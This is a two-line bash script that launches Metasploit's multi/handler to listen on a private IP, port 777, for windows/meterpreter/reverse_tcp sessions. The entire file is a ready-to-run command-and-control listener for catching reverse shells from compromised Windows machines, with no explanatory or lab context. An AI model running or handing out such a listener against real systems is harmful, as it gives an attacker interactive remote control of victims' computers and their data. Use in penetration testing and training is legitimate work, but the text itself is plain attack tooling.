#!/bin/bash

msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.8; set LPORT 777; run"
